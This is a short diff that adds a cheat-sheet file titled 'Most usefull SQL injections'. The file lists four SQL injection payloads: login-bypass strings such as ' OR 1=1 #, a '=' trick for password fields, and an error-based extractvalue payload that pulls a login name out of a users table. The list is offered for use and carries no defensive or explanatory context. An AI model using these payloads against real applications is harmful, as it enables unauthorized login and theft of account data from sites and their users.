@@ -1,0 +1,5 @@
+------- Most usefull SQL injections --------
+' OR 1=1 #
+'=' (for password)
+'||'
+' AND extractvalue(1,concat(0x3a,(select login from users limit 0,1)))
